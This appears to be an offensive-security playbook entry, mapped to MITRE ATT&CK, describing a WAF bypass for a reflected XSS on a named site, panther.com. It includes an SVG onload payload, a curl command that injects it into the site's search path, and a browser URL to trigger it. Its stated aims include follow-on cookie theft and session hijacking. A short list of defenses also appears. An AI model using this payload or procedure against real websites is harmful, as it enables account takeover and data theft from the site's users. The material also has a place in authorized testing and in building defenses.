---
id: proc-002
name: Bypass-WAF-for-JavaScript-Execution-in-XSS
tags:
  - xss
  - waf-bypass
  - javascript-execution
  - svg-payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-svg-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:50.045Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Bypass-WAF-for-JavaScript-Execution-in-XSS

## Summary

This procedure exploits a confirmed reflected XSS by crafting an SVG payload that evades WAF filters, allowing JavaScript execution within the vulnerable search parameter. Applied to panther.com, it demonstrates full client-side code execution, enabling attacks like session hijacking.

## Description

Building on basic HTML injection, this targets WAF rules that block direct <script> tags by using alternative vectors like SVG elements with onload attributes. The payload "<svg on onload=(alert)(document.domain)>" is URL-encoded and injected into the search parameter. When reflected, the SVG loads and triggers the JavaScript alert. This requires prior confirmation of the vulnerability and works in browser contexts. Outcomes include arbitrary JS execution, leading to data exfiltration or phishing.

## Requirements

1. Confirmed HTML-reflecting endpoint (from prior test)
2. Web browser to execute the payload
3. Knowledge of WAF evasion techniques (e.g., attribute obfuscation)

## Defense

Defensive measures and detection strategies:

- Update WAF rules to detect SVG-based injections and onload events
- Enforce strict XSS filters that neutralize all event handlers and script-like attributes
- Log and alert on reflected payloads containing SVG or JS keywords for manual review

## Objectives

1. Evade WAF to inject executable JavaScript
2. Demonstrate control over the page context (e.g., via alert)
3. Enable follow-on attacks like cookie theft

## Instructions

### Step 1: Encode and Test SVG Payload

**Context**: Create a WAF-bypassing payload using SVG to trigger JS on load, avoiding blocked script patterns.

**Command** ([[commands/curl-svg-xss-test]]):
```bash
curl -s "https://panther.com/search/test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E" | grep -i "svg"
```

> The curl retrieves the response; grep confirms the SVG tag is reflected unfiltered. Expected output shows the payload in the HTML source.

### Step 2: Execute in Browser

**Context**: Load the payload in a browser to trigger the onload event and JS execution.

No command; visit https://panther.com/search/test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E.

> An alert should pop up with the domain name, verifying JS execution. Inspect the console for any errors or blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-svg-xss-test]]

## Tools Used


## Tags

- [[xss]]
- [[waf-bypass]]
- [[javascript-execution]]
- [[svg-payload]]
